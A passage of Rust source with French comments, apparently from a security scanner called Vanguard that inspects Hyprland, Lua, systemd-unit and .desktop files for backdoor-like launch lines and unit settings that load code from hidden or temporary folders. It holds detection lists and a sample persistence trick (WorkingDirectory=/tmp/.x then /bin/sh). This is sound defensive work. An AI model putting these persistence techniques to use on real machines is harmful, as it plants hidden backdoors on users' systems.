                Lecteur::Systemd(Codes {
                    variables: variables_fusionnees(f, &lu.texte, &base, &t.r),
                    sauvegarde: (utilisateur && f.file_name().is_some_and(|n| n == crate::sauvegarde::SERVICE))
                        .then(|| crate::sauvegarde::sauvegarde_posee(&lu.texte))
                        .flatten(),
                    ..base
                })
            };
            // Une unité que le compte peut écrire : chaque clé dans la liste permise de sa section (vérification 3).
            let a_juger = unite && !de_root_seul(f);
            let (lue, session) = (t.r.maison.to_string_lossy().into_owned(), home());
            let maisons = [session.as_str(), lue.as_str()];
            let mut section: Option<String> = None;
            for logique in lignes_de_systemd(&lu.texte) {
                if let Some(nom) = logique.texte.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
                    section = Some(nom.to_string());
                    continue;
                }
                let n = logique.numero.saturating_sub(1);
                // Écrite sur une seule ligne, telle que systemd la lit : la ligne elle-même, comme avant ce lot.
                let simple = logique.lues == 1
                    && ecrites.get(n) == Some(&logique.premiere.as_str())
                    && logique.premiere.trim_matches([' ', '\t']) == logique.texte;
                let ligne = if simple { &logique.premiere } else { &logique.texte };
                let s = if simple || matches!(sorte, Sorte::Ajoutee(_)) {
                    sorte
                } else {
                    Sorte::Ajoutee(Ajout::Jointe {
                        bureau: sorte == Sorte::Bureau,
                        utilisateur,
                    })
                };
                // La liste permise d'abord, la porte unique du silence (vérification 4, D1) : sa raison est celle
                // qui se montre. `reglage_suspect` vient ensuite, en filet : une ligne que la liste laisserait passer
                // (ou celle d'une unité à root seul, qu'elle ne juge pas) reste levée par lui. Les deux lèvent un
                // réglage (`Ajout::Reglage`), jamais déclarable, dont le refus nomme la clé.
                if a_juger && let Lecteur::Systemd(codes) = &lecteur {
                    let s = permise::Systeme {
                        racine: &t.r.racine,
                        maison: &lue,
                        maisons: &maisons,
                    };
                    if let Err(e) = permise::directive(&s, codes, section.as_deref(), &logique.texte) {
                        lever(
                            t,
                            f,
                            &lu,
                            n,
                            ligne,
                            &logique.texte,
                            true,
                            Sorte::Ajoutee(Ajout::Reglage),
                            simple,
                            e.raison(),
                        );
                        continue;
                    }
                }
                if unite && let Some(raison) = reglage_suspect(&logique.texte, &t.r) {
                    lever(
                        t,
                        f,
                        &lu,
                        n,
                        ligne,
                        &logique.texte,
                        true,
                        Sorte::Ajoutee(Ajout::Reglage),
                        simple,
                        raison,
                    );
                    continue;
                }
                let Some((commande, ambigue)) = commande_lancee_lue(&logique.texte) else {
                    continue;
                };
                if simple && sorte == Sorte::Bureau {
                    continue;
                }
                juger_lancement(t, f, &lu, n, ligne, &commande, ambigue, s, simple, &lecteur);
            }
        }
        if a_l_extension(f, "lua") && (t.r.dans_hypr(f) || t.r.modules.iter().any(|m| m == f)) {
            juger_lua(t, f, h, &lu, &ecrites, &levees);
        }
    }
}

/// Un fichier des bascules ou des dispositions d'Omarchy dont le nom a un point avant « .lua » (vérification 3,
/// H2) : require_all.lua en fait « require("a.b") », que Lua cherche en a/b.lua dans tout package.path ; le
/// fichier jugé n'est pas celui qui est chargé.
fn charge_sous_un_autre_nom(r: &Releveur, f: &Path) -> bool {
    const DOSSIERS: [&str; 2] = ["omarchy/toggles/hypr", "omarchy/workspace-layouts"];
    let mut etats = vec![r.maison.join(".local/state")];
    etats.extend(r.etat.as_ref().map(|e| r.sous(e)));
    let premier_niveau = f
        .parent()
        .is_some_and(|p| etats.iter().any(|e| DOSSIERS.iter().any(|d| p == e.join(d))));
    let nom = f.file_name().map(|n| n.to_string_lossy()).unwrap_or_default();
    premier_niveau && nom.strip_suffix(".lua").is_some_and(|tige| tige.contains('.'))
}

/// Un fichier Lua que Vanguard lit : sous les dossiers de Hyprland, ou un module d'Omarchy relevé ou levé à part
/// (`MODULES_D_OMARCHY`).
fn lua_lu(r: &Releveur, f: &Path) -> bool {
    a_l_extension(f, "lua")
        && (r.dans_hypr(f)
            || r.modules.iter().any(|m| m == f)
            || MODULES_D_OMARCHY.iter().any(|(d, _)| f.starts_with(r.maison.join(d))))
}

/// Pourquoi ce qu'un appel Lua charge (« require "x.y" », « dofile "…" » écrits en toutes lettres) n'est pas vérifié,
/// ou `None` (vérification 2, mineurs, N11) : le premier fichier que le chemin de modules d'Omarchy trouve
/// (~/.local/state/?.lua, ~/.config/?.lua, puis /usr/share/omarchy/?.lua ; bootstrap.lua), ou à défaut celui du
/// dossier de Hyprland, doit être lu ; introuvable, il vient d'ailleurs (LUA_PATH, dossier courant) ou manque.
fn charge_hors_lecture(r: &Releveur, appel: &AppelLu) -> Option<&'static str> {
    let omarchy = r.sous(Path::new(OMARCHY));
    let hors = || {
        tr!(
            "code Lua chargé d'un fichier que Vanguard ne lit pas (hors de ~/.config/hypr et des modules d'Omarchy) : non vérifié",
            "Lua code loaded from a file Vanguard does not read (outside ~/.config/hypr and Omarchy's modules): not checked"
        )
    };
    let introuvable = || {
        tr!(
            "module Lua introuvable dans les dossiers connus (~/.config/hypr, ~/.local/state, ~/.config, /usr/share/omarchy) : chargé d'ailleurs (LUA_PATH, dossier courant) ou absent, non vérifié",
            "Lua module not found in the known folders (~/.config/hypr, ~/.local/state, ~/.config, /usr/share/omarchy): loaded from elsewhere (LUA_PATH, current folder) or missing, not checked"
        )
    };
    let existe = |f: &Path| std::fs::metadata(f).is_ok();
    for nom in &appel.modules {
        if nom.is_empty() || nom.contains(['/', '\\']) || nom.split('.').any(str::is_empty) {
            return Some(introuvable());
        }
        let rel = format!("{}.lua", nom.replace('.', "/"));
        let trouve = [r.maison.join(".local/state"), r.maison.join(".config"), omarchy.clone()]
            .into_iter()
            .chain(std::iter::once(r.maison.join(".config/hypr")))
            .chain(r.config.as_ref().map(|c| r.sous(&c.join("hypr"))))
            .map(|d| d.join(&rel))
            .find(|f| existe(f));
        match trouve {
            None => return Some(introuvable()),
            Some(f) if !f.starts_with(&omarchy) && !lua_lu(r, &f) => return Some(hors()),
            Some(_) => {}
        }
    }
    for chemin in &appel.fichiers {
        let simple = chemin_simplifie(chemin);
        let f = if let Some(rel) = simple.strip_prefix("$HOME/").or_else(|| simple.strip_prefix("~/")) {
            r.maison.join(rel)
        } else if simple.starts_with('/') && !simple.contains("/../") {
            r.sous(Path::new(simple.as_str()))
        } else {
            return Some(introuvable());
        };
        if !(f.starts_with(&omarchy) || lua_lu(r, &f)) {
            return Some(hors());
        }
    }
    None
}

/// Les lignes d'un fichier Lua comptées comme Lua les compte (`jetons_lua`) : « \r » seul finit une ligne aussi.
fn lignes_de_lua(texte: &str) -> Vec<&str> {
    let octets = texte.as_bytes();
    let mut lignes = Vec::new();
    let (mut debut, mut i) = (0_usize, 0_usize);
    while let Some(&b) = octets.get(i) {
        i = i.saturating_add(1);
        if b == b'\n' || b == b'\r' {
            lignes.push(texte.get(debut..i.saturating_sub(1)).unwrap_or_default());
            if octets.get(i) == Some(&if b == b'\n' { b'\r' } else { b'\n' }) {
                i = i.saturating_add(1);
            }
            debut = i;
        }
    }
    if debut < texte.len() {
        lignes.push(texte.get(debut..).unwrap_or_default());
    }
    lignes
}

/// Juge les appels d'un fichier Lua de Hyprland (`appels_lua`) : chaque commande lue en toutes lettres comme une
/// commande lancée ; un appel qui ne se lit pas, levé (jamais tu). Une ligne déjà levée par `commande_lancee_lue`
/// (`levees`) ne se lève pas deux fois.
fn juger_lua(t: &mut Lancements, f: &Path, h: &Path, lu: &Lecture, ecrites: &[&str], levees: &[usize]) {
    if charge_sous_un_autre_nom(&t.r, f) {
        non_lu(
            f,
            h,
            t,
            tr!(
                "nom à point : Omarchy charge à sa place un autre fichier (« a.b » devient a/b.lua)",
                "dotted name: Omarchy loads another file in its place (\"a.b\" becomes a/b.lua)"
            ),
        );
    }
    let mut appels = appels_lua(&lu.texte);
    if appels.len() > APPELS_LUA_MAX {
        appels.truncate(APPELS_LUA_MAX);
        non_lu(
            f,
            h,
            t,
            tr!(
                "trop d'appels Lua pour être tous lus",
                "too many Lua calls to read them all"
            ),
        );
    }
    let mut vues: Vec<usize> = levees.to_vec();
    for appel in appels {
        let n = appel.debut;
        if vues.contains(&n) {
            continue;
        }
        // Sur une seule ligne, la ligne écrite entière (celle qu'un retrait ôterait) ; sinon l'appel joint.
        let une_ligne = appel.debut == appel.fin;
        let ligne = ecrites
            .get(appel.debut..=appel.fin)
            .map_or_else(String::new, |l| l.join("\n"));
        let mut levee = false;
        let lues = appel
            .commandes
            .iter()
            .map(|c| (c, Lecteur::Brut))
            .chain(appel.textes.iter().map(|c| (c, Lecteur::Texte)));
        for (commande, lecteur) in lues {
            levee = juger_lancement(
                t,
                f,
                lu,
                n,
                &ligne,
                commande,
                false,
                Sorte::Ajoutee(Ajout::Raccourci),
                une_ligne,
                &lecteur,
            );
            if levee {
                break;
            }
        }
        let raison = appel.non_lu.or_else(|| charge_hors_lecture(&t.r, &appel));
        if !levee && let Some(raison) = raison {
            let commande = crate::ui::couper(ligne.trim(), 200);
            lever(
                t,
                f,
                lu,
                n,
                &ligne,
                &commande,
                true,
                Sorte::Ajoutee(Ajout::CleHypr),
                une_ligne,
                raison,
            );
            levee = true;
        }
        if levee {
            vues.push(n);
        }
    }
}

/// Juge les lignes d'un fichier de Hyprland telles que les lit hyprlang (`lignes_de_hyprlang`) : chaque lancement
/// (`lancements_de_hypr`, `commande_lancee_lue`) ; puis, si rien n'est levé, la ligne relue après le remplacement des
/// variables sur la valeur entière (relecture adverse, B1 : « bind = $m, Q, $e, … » où « $e » vaut « exec ») ; une
/// variable sans valeur connue dans une clé qui lance est dite ; enfin, toute autre clé dont un mot nomme un
/// programme existant d'un dossier caché ou temporaire (relecture adverse, C8).
fn juger_hypr(
    t: &mut Lancements,
    f: &Path,
    lu: &Lecture,
    ecrites: &[&str],
    sorte: Sorte,
    variables: &std::collections::BTreeMap<String, Vec<String>>,
) {
    let lue = t.r.maison.to_string_lossy().into_owned();
    let session = home();
    let maisons = [session.as_str(), lue.as_str()];
    for (n, lues, texte) in lignes_de_hyprlang(&lu.texte) {
        let simple = lues == 1;
        let ligne = if simple {
            ecrites.get(n).map_or_else(|| texte.clone(), |l| (*l).to_string())
        } else {
            texte.trim_end_matches('\r').to_string()
        };
        let sorte_de = |ajout: Option<Ajout>| {
            if simple {
                ajout.map_or(sorte, Sorte::Ajoutee)
            } else {
                Sorte::Ajoutee(Ajout::JointeHypr)
            }
        };
        let mut lancees: Vec<(String, bool, Option<Ajout>)> = lancements_de_hypr(&texte)
            .into_iter()
            .map(|(c, a, j)| (c, a, Some(j)))
            .collect();
        if lancees.is_empty()
            && let Some((c, a)) = commande_lancee_lue(&texte)
        {
            lancees.push((c, a, None));
        }
        let mut levee = false;
        for (c, a, j) in &lancees {
            let s = sorte_de(*j);
            levee |= juger_lancement(t, f, lu, n, &ligne, c, *a, s, simple, &Lecteur::Hypr(variables));
        }
        let Some(cle) = cle_de_hypr(&texte) else { continue };
        if levee || commentaire(&texte) || cle.starts_with('$') {
            continue;
        }
        let valeur = texte.split_once('=').map_or("", |(_, v)| v);
        let a_part = Sorte::Ajoutee(Ajout::CleHypr);
        // « env = NOM,valeur » : une variable de recherche ou d'injection posée pour tout ce que lance Hyprland
        // (relecture adverse 2, N8), ses variables de Hyprland remplacées.
        if cle == "env"
            && let Some((nom, v)) = valeur.split_once(',')
        {
            let formes = resoudre_hypr(v.trim(), variables).unwrap_or_else(|| vec![v.trim().to_string()]);
            if let Some(raison) = formes.iter().find_map(|v| variable_suspecte(nom.trim(), v, &maisons)) {
                lever(t, f, lu, n, &ligne, valeur.trim(), true, a_part, simple, raison);
                continue;
            }
        }
        if valeur.contains('$') {
            match resoudre_hypr(valeur, variables) {
                Some(formes) => {
                    let raison = formes.iter().find_map(|forme| {
                        let relue = format!("{cle} = {forme}");
                        let mut commandes: Vec<String> =
                            lancements_de_hypr(&relue).into_iter().map(|(c, _, _)| c).collect();
                        commandes.extend(commande_lancee_lue(&relue).map(|(c, _)| c));
                        commandes.iter().find_map(|c| {
                            commande_suspecte_chez(c, true, &maisons).or_else(|| {
                                match ligne_de_shell_suspecte(c, &maisons, !de_root_seul(f)) {
                                    Ok(raison) => raison,
                                    Err(()) => (!de_root_seul(f)).then(shell_non_lu),
                                }
                            })
                        })
                    });
                    if let Some(raison) = raison {
                        lever(t, f, lu, n, &ligne, valeur.trim(), true, a_part, simple, raison);
                        continue;
                    }
                }
                None if cle_qui_lance(cle) && cle != "source" => {
                    lever(
                        t,
                        f,
                        lu,
                        n,
                        &ligne,
                        valeur.trim(),
                        true,
                        a_part,
                        simple,
                        variable_inconnue(),
                    );
                    continue;
                }
                None => {}
            }
        }
        if lancees.is_empty() && !cle_qui_lance(cle) {
            let mots = valeur.split(|c: char| {
                c.is_whitespace() || matches!(c, ',' | '"' | '\'' | '(' | ')' | '[' | ']' | '{' | '}' | ';' | '=')
            });
            let trouve = mots.filter(|m| !m.is_empty()).find_map(|m| {
                let raison = maisons.iter().find_map(|maison| programme_cache(m, maison))?;
                executable(&t.r, m).then_some(raison)
            });
            if let Some(raison) = trouve {
                lever(t, f, lu, n, &ligne, valeur.trim(), true, a_part, simple, raison);
            }
        }
    }
}

/// Un mot d'une ligne qui nomme un fichier exécutable de l'ordinateur (« ~/ » et « $HOME/ » lus sous le dossier
/// personnel), lu sous la racine.
fn executable(r: &Releveur, mot: &str) -> bool {
    use std::os::unix::fs::PermissionsExt as _;
    let chemin = match mot.strip_prefix("~/").or_else(|| mot.strip_prefix("$HOME/")) {
        Some(reste) => r.maison.join(reste),
        None if mot.starts_with('/') => r.sous(Path::new(&chemin_simplifie(mot))),
        None => return false,
    };
    std::fs::metadata(chemin).is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
}

/// Pourquoi une ligne d'unité change ce qui se lance sans ligne Exec, ou `None` (relecture adverse, C5 ; relecture
/// adverse 2, N6) : une bibliothèque préchargée ou une variable de recherche ou d'injection qui mène à un dossier caché
/// ou temporaire (« Environment= », ou le contenu d'un « EnvironmentFile= »), un dossier de recherche des programmes
/// caché ou temporaire (« ExecSearchPath= »), un fichier de variables, un dossier courant, une entrée, une racine ou
/// un montage dans un dossier caché ou temporaire (ce que lit l'interpréteur lancé : « WorkingDirectory=/tmp/.x »
/// puis « /bin/sh a.sh »).
fn reglage_suspect(ligne: &str, r: &Releveur) -> Option<&'static str> {
    const CLES: [&str; 11] = [
        "Environment",
        "ExecSearchPath",
        "EnvironmentFile",
        "WorkingDirectory",
        "StandardInput",
        "StandardInputFile",
        "RootDirectory",
        "RootImage",
        "BindPaths",
        "BindReadOnlyPaths",
        "MountImages",
    ];
    let (cle, valeur) = ligne.split_once('=')?;
    let cle = cle.trim_matches([' ', '\t']);
    if !CLES.contains(&cle) {
        return None;
    }
    let codes = Codes::de(true, r);
    let valeur = developper_codes(valeur.trim_matches([' ', '\t']), &codes).unwrap_or_else(|| valeur.to_string());
    let (session, lue) = (home(), codes.maison.clone());
    let maisons = [session.as_str(), lue.as_str()];
    let cache = |chemin: &str| {
        let programme = format!("{}/x", chemin.trim_end_matches('/'));
        // Sous le dossier personnel lu, lui seul compte (le plus précis) ; sinon celui de la session aussi.
        if programme.starts_with(&format!("{lue}/")) {
            return programme_cache(&programme, &lue).is_some();
        }
        maisons.iter().any(|m| programme_cache(&programme, m).is_some())
    };
    let dossier = tr!(
        "réglage d'unité qui fait chercher programmes ou bibliothèques dans un dossier caché ou temporaire (PATH, LD_LIBRARY_PATH, ExecSearchPath)",
        "unit setting that makes programs or libraries be looked up in a hidden or temporary folder (PATH, LD_LIBRARY_PATH, ExecSearchPath)"
    );
    let lu_ailleurs = tr!(
        "réglage d'unité qui fait lire ses variables, son dossier courant, son entrée ou sa racine dans un dossier caché ou temporaire (EnvironmentFile, WorkingDirectory, StandardInput, RootDirectory, BindPaths)",
        "unit setting that reads its variables, working folder, input or root from a hidden or temporary folder (EnvironmentFile, WorkingDirectory, StandardInput, RootDirectory, BindPaths)"
    );
    let variables = |mots: Vec<String>| {
        mots.iter().find_map(|mot| {
            let (nom, v) = mot.split_once('=')?;
            variable_suspecte(nom.trim(), v, &maisons).map(|raison| {
                if ["PATH", "LD_LIBRARY_PATH"].contains(&nom.trim()) {
                    dossier
                } else {
                    raison
                }
            })
        })
    };
    match cle {
        "ExecSearchPath" => valeur.split(':').any(cache).then_some(dossier),
        "EnvironmentFile" => {
            let fichier = valeur.trim_start_matches('-');
            if cache(fichier.rsplit_once('/').map_or("", |(d, _)| d)) {
                return Some(lu_ailleurs);
            }
            // Son contenu, lu comme systemd le lit (lignes recollées, guillemets ôtés : vérification 3, P5) : les
            // variables qu'il pose se jugent comme celles d'« Environment= ». Illisible ou trop gros : la liste
            // permise (`permise::directive`) le dit.
            let lues = permise::lire_variables(&r.sous(Path::new(fichier))).ok()?;
            variables(lues.into_iter().map(|(n, v)| format!("{n}={v}")).collect())
        }
        "WorkingDirectory" | "RootDirectory" => {
            cache(valeur.trim_start_matches(['-', '+', '!'])).then_some(lu_ailleurs)
        }
        "RootImage" => {
            cache(valeur.trim_start_matches('-').rsplit_once('/').map_or("", |(d, _)| d)).then_some(lu_ailleurs)
        }
        "StandardInput" | "StandardInputFile" => {
            let chemin = valeur.strip_prefix("file:").unwrap_or(&valeur);
            (chemin.starts_with('/') && cache(chemin.rsplit_once('/').map_or("", |(d, _)| d))).then_some(lu_ailleurs)
        }
        "BindPaths" | "BindReadOnlyPaths" | "MountImages" => valeur
            .split_whitespace()
            .filter_map(|m| m.trim_start_matches(['-', '+']).split(':').next())
            .any(|source| cache(source.rsplit_once('/').map_or("", |(d, _)| d)))
            .then_some(lu_ailleurs),
        _ => {
            let mots = commandes_de_systemd(&valeur).map_or_else(
                || valeur.split_whitespace().map(str::to_string).collect::<Vec<_>>(),
                |c| c.into_iter().flatten().collect(),
            );
            variables(mots)
        }
    }
}

/// Comment la commande d'une ligne se ramène à ce qui se lance (relecture adverse, cause racine : juger la forme
/// finale, pas le texte) : telle qu'écrite, comme systemd (ses codes « % », guillemets, échappements, « ; »), comme
/// un .desktop (ses codes de champ ôtés, puis comme systemd), ou comme Hyprland (ses variables remplacées).
enum Lecteur<'a> {
    /// Un texte qui ne se lance pas (touches, description d'un raccourci Lua) : ses seuls mots jugés.
    Texte,
    /// Une ligne de shell (`ligne_de_shell_suspecte`).
    Brut,
    Systemd(Codes),
    Bureau,
    Hypr(&'a std::collections::BTreeMap<String, Vec<String>>),
}

/// La raison d'une commande que Vanguard ne ramène pas à ce que systemd lance.
fn non_resolu_systemd() -> &'static str {
    tr!(
        "commande que Vanguard ne ramène pas à ce que systemd lance (code « % » de l'unité, échappement ou guillemet) : non vérifiée",
        "command Vanguard cannot reduce to what systemd starts (unit “%” specifier, escape or quote): not checked"
    )
}

/// Une valeur Exec de .desktop sans ses codes de champ (« %f », « %U »… : des fichiers donnés au lancement ; « %% »
/// est « % »), prête à se lire comme systemd-xdg-autostart-generator la confie à systemd.
fn sans_codes_de_bureau(valeur: &str) -> String {
    let mut sortie = String::with_capacity(valeur.len());
    let mut lettres = valeur.chars();
    while let Some(c) = lettres.next() {
        if c != '%' {
            sortie.push(c);
            continue;
        }
        if lettres.next() == Some('%') {
            sortie.push('%');
        }
    }
    sortie
}

/// Juge la `commande` lancée par la `ligne` (numéro `n`, à partir de 0) du fichier `f` lu `lu` : levée si elle
/// ressemble à une porte dérobée, telle qu'écrite ou une fois ramenée à sa forme finale par son `lecteur` ; une
/// forme finale que Vanguard ne sait pas calculer (variable de Hyprland sans valeur, code de l'unité) est levée aussi,
/// jamais tue. `retirable` : la ligne est écrite telle quelle dans le fichier (sinon, jointe ou lue par morceaux,
/// aucun retrait n'est proposé). Vrai si la ligne est levée.
#[allow(clippy::too_many_arguments)]
fn juger_lancement(
    t: &mut Lancements,
    f: &Path,
    lu: &Lecture,
    n: usize,
    ligne: &str,
    commande: &str,
    ambigue: bool,
    sorte: Sorte,
    retirable: bool,
    lecteur: &Lecteur<'_>,
) -> bool {
    let lue = t.r.maison.to_string_lossy().into_owned();
    let session = home();
    let maisons = [session.as_str(), lue.as_str()];
    let racine_seul = de_root_seul(f);
    // Une ligne géante ne se découpe pas (vérification 3, S15 : des minutes) : dite, jamais tue.
    if !racine_seul && commande.len() > permise::LIGNE_MAX {
        let raison = permise::Ecart::Longue.raison();
        lever(t, f, lu, n, ligne, commande, true, sorte, retirable, raison);
        return true;
    }
    // Une forme finale qui ne se calcule pas, dans un fichier que seul root écrit, est celle de root (un paquet, un
    // administrateur) : dite seulement là où le compte écrit.
    let dite = |r: Result<Option<&'static str>, ()>| match r {
        Ok(raison) => raison,
        Err(()) if de_root_seul(f) => None,
        Err(()) => Some(non_resolu_systemd()),
    };
    let tout_argument = !de_root_seul(f);
    // Une ligne de shell qui ne se lit pas : dite comme telle, là où le compte écrit.
    let shell = |c: &str| match ligne_de_shell_suspecte(c, &maisons, tout_argument) {
        Ok(raison) => raison,
        Err(()) if de_root_seul(f) => None,
        Err(()) => Some(shell_non_lu()),
    };
    let raison = commande_suspecte_chez(commande, true, &maisons).or_else(|| match lecteur {
        Lecteur::Texte => None,
        Lecteur::Brut => shell(commande),
        Lecteur::Systemd(codes) => dite(forme_finale_de_systemd(commande, Some(codes), &maisons, tout_argument)),
        Lecteur::Bureau => dite(forme_finale_de_systemd(
            &sans_codes_de_bureau(commande),
            None,
            &maisons,
            tout_argument,
        )),
        Lecteur::Hypr(variables) => {
            if !commande.contains('$') {
                return shell(commande);
            }
            match resoudre_hypr(commande, variables) {
                Some(formes) => formes
                    .iter()
                    .find_map(|c| commande_suspecte_chez(c, true, &maisons).or_else(|| shell(c))),
                None => Some(variable_inconnue()),
            }
        }
    });
    // La liste permise (vérification 3) : là où le compte écrit, le silence n'est gardé que pour une ligne dont la
    // forme entière est reconnue sûre ; le découpage d'avant ne sert plus qu'à dire une raison plus précise.
    let (raison, hors_liste) = match raison {
        Some(r) => (Some(r), false),
        None if racine_seul => (None, false),
        None => (hors_de_la_liste(&t.r, commande, lecteur, &maisons), true),
    };
    let Some(raison) = raison else {
        return false;
    };
    // Ce qui ne se lit pas sûrement ne se déclare pas normal : ce qu'un choix lierait ne dirait pas ce qui se lance.
    let ambigue =
        ambigue || hors_liste || [shell_non_lu(), non_resolu_systemd(), variable_inconnue()].contains(&raison);
    lever(t, f, lu, n, ligne, commande, ambigue, sorte, retirable, raison);
    true
}

/// Pourquoi la `commande` d'une ligne que le compte écrit n'entre pas dans la liste permise (`permise`), lue par
/// son `lecteur`, ou `None` : le filet textuel d'abord (un dossier temporaire ou caché nommé en toutes lettres), puis
/// la forme entière. Un texte qui ne se lance pas (`Lecteur::Texte`) n'y passe pas.
fn hors_de_la_liste(r: &Releveur, commande: &str, lecteur: &Lecteur<'_>, maisons: &[&str]) -> Option<&'static str> {
    let lue = r.maison.to_string_lossy();
    let s = permise::Systeme {
        racine: &r.racine,
        maison: &lue,
        maisons,
    };
    let ecart = match lecteur {
        Lecteur::Texte => return None,
        Lecteur::Systemd(codes) => permise::exec_systemd(&s, commande, Some(codes)),
        Lecteur::Bureau => permise::exec_systemd(&s, &sans_codes_de_bureau(commande), None),
        Lecteur::Hypr(variables) if commande.contains('$') => match resoudre_hypr(commande, variables) {
            Some(formes) => formes.iter().try_for_each(|c| permise::ligne_shell(&s, c)),
            None => return Some(variable_inconnue()),
        },
        Lecteur::Brut | Lecteur::Hypr(_) => permise::ligne_shell(&s, commande),
    };
    if permise::filet(commande, matches!(lecteur, Lecteur::Systemd(_)), maisons) {
        return Some(permise::Ecart::Filet.raison());
    }
    ecart.err().map(permise::Ecart::raison)
}

/// La raison d'une ligne de Hyprland dont une variable n'a pas de valeur connue.
fn variable_inconnue() -> &'static str {
    tr!(
        "variable de Hyprland ou du shell sans valeur connue : ce que la ligne lance ne se voit pas",
        "Hyprland or shell variable without a known value: what the line starts cannot be seen"
    )
}

/// Lève la `ligne` (numéro `n`, à partir de 0) du fichier `f` lu `lu`, qui lance `commande`, pour la `raison` dite :
/// sa source, son retrait s'il est `retirable`, son témoin (ce qu'un choix « normal » lierait, ou pourquoi on ne
/// peut pas), et la ligne de l'alerte.
#[allow(clippy::too_many_arguments)]
fn lever(
    t: &mut Lancements,
    f: &Path,
    lu: &Lecture,
    n: usize,
    ligne: &str,
    commande: &str,
    ambigue: bool,
    sorte: Sorte,
    retirable: bool,
    raison: &str,
) {
    t.sources
        .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), ligne));
    t.retraits
        .push(if retirable { retrait(f, &lu.texte, ligne) } else { None });
    let maison = maison_texte(t);
    let designe = if ambigue {
        Designe::Indefini(designes::Flou::Syntaxe)
    } else {
        designes::commande(commande, sorte.contexte(&maison))
    };
    let temoin = temoin_de_ligne(t, f, n, lu, ligne, designe, true, sorte);
    t.temoins.push(temoin);
    let perso = t.r.maison.clone();
    t.suspects.push(trf!(
        "{}:{} : {raison}",
        "{}:{}: {raison}",
        court(f, &perso),
        n.saturating_add(1)
    ));
}

/// Ce qu'une ligne d'un fichier .conf de Hyprland lance, au-delà de `commande_lancee_lue` : un raccourci (toute forme
/// « bind… = MODS, touche, exec, commande », « bindd » avec sa description en plus : chaque champ à partir du
/// troisième qui vaut « exec » ou « execr »), un geste (« gesture = 3, up, dispatcher, exec, commande »), un
/// lancement précédé de règles (« exec-once = [workspace 2 silent] commande », jusqu'au premier « ] » comme
/// Hyprland), un greffon chargé (« plugin = chemin.so ») ou une commande d'hypridle (« on-timeout = … »,
/// « lock_cmd = … »). Une clé dans une catégorie écrite sur la ligne (« x { exec-once = … } ») compte comme seule.
/// Chaque commande, si elle est ambiguë (des règles sans « ] »), et la sorte de la ligne.
fn lancements_de_hypr(ligne: &str) -> Vec<(String, bool, Ajout)> {
    let l = ligne.trim();
    if commentaire(l) {
        return Vec::new();
    }
    let Some((cle, valeur)) = l.split_once('=') else {
        return Vec::new();
    };
    let dans_une_categorie = cle.contains('{');
    let cle = cle.rsplit('{').next().unwrap_or_default().trim();
    let mut valeur = valeur.trim();
    if dans_une_categorie {
        valeur = valeur.strip_suffix('}').unwrap_or(valeur).trim();
    }
    let sans_regles = |v: &str| -> (String, bool) {
        match v.strip_prefix('[') {
            Some(reste) => match reste.split_once(']') {
                Some((_, commande)) => (commande.trim().to_string(), false),
                None => (v.to_string(), true),
            },
            None => (v.to_string(), false),
        }
    };
    let mut trouves = Vec::new();
    let raccourci = cle
        .strip_prefix("bind")
        .is_some_and(|drapeaux| drapeaux.bytes().all(|b| b.is_ascii_lowercase()));
    if raccourci || cle == "gesture" {
        let champs: Vec<&str> = valeur.split(',').collect();
        for (i, champ) in champs.iter().enumerate().skip(2) {
            let repartiteur = champ.trim();
            let reste = || {
                champs
                    .get(i.saturating_add(1)..)
                    .unwrap_or_default()
                    .join(",")
                    .trim()
                    .to_string()
            };
            if repartiteur.eq_ignore_ascii_case("exec") {
                let (c, ambigue) = sans_regles(&reste());
                trouves.push((c, ambigue, Ajout::Raccourci));
            } else if repartiteur.eq_ignore_ascii_case("execr") {
                trouves.push((reste(), false, Ajout::Raccourci));
            }
        }
        return trouves;
    }
    if ["exec-once", "exec", "execr-once", "execr", "exec-shutdown"].contains(&cle) {
        if valeur.starts_with('[') {
            let (c, ambigue) = sans_regles(valeur);
            trouves.push((c, ambigue, Ajout::LancementHypr));
        } else if dans_une_categorie {
            trouves.push((valeur.to_string(), false, Ajout::LancementHypr));
        }
        return trouves;
    }
    if CLES_DE_HYPR.contains(&cle) {
        trouves.push((valeur.to_string(), false, Ajout::CleHypr));
    }
    trouves
}

/// Les clés des fichiers de Hyprland, d'hypridle et d'hyprlock qui chargent du code ou lancent une commande, hors des
/// « exec… » et des raccourcis (relecture adverse, C8).
const CLES_DE_HYPR: [&str; 9] = [
    "plugin",
    "on-timeout",
    "on-resume",
    "lock_cmd",
    "unlock_cmd",
    "on_lock_cmd",
    "on_unlock_cmd",
    "before_sleep_cmd",
    "after_sleep_cmd",
];

/// La clé d'une ligne de Hyprland, catégorie écrite sur la ligne ôtée (« x { exec-once » est « exec-once »).
fn cle_de_hypr(ligne: &str) -> Option<&str> {
    let (cle, _) = ligne.trim().split_once('=')?;
    Some(cle.rsplit('{').next().unwrap_or_default().trim())
}

/// Une clé de Hyprland qui lance ou charge quelque chose (`lancements_de_hypr`, `commande_lancee_lue`).
fn cle_qui_lance(cle: &str) -> bool {
    cle.strip_prefix("bind")
        .is_some_and(|d| d.bytes().all(|b| b.is_ascii_lowercase()))
        || cle == "gesture"
        || cle == "source"
        || ["exec-once", "exec", "execr-once", "execr", "exec-shutdown"].contains(&cle)
        || CLES_DE_HYPR.contains(&cle)
}

/// Une ligne de Hyprland telle que la lit hyprlang : coupée sur « \n » seul (« \r » reste dans la ligne), une ligne
/// qui finit par « \ » jointe à la suivante sans rien entre les deux (relecture adverse, B3 : « \ » suivi d'un
/// blanc n'est pas une continuation). Le numéro de sa première ligne (à partir de 0), combien de lignes écrites elle
/// joint, son texte.
fn lignes_de_hyprlang(texte: &str) -> Vec<(usize, usize, String)> {
    let mut sortie = Vec::new();
    let mut cours: Option<(usize, usize, String)> = None;
    for (n, brute) in texte.split('\n').enumerate() {
        let (debut, lues, mut joint) = cours.take().unwrap_or((n, 0, String::new()));
        joint.push_str(brute);
        let lues = lues.saturating_add(1);
        if joint.ends_with('\\') {
            joint.pop();
            cours = Some((debut, lues, joint));
        } else {
            sortie.push((debut, lues, joint));
        }
    }
    if let Some(c) = cours {
        sortie.push(c);
    }
    // Une fin de fichier en « \n » laisse une dernière ligne vide, que rien ne lit.
    if sortie.last().is_some_and(|(_, _, l)| l.is_empty()) {
        sortie.pop();
    }
    sortie
}

/// Au plus autant d'appels lus dans un fichier Lua ; au-delà, le reste n'est pas vérifié (dit dans l'alerte).
const APPELS_LUA_MAX: usize = 4096;

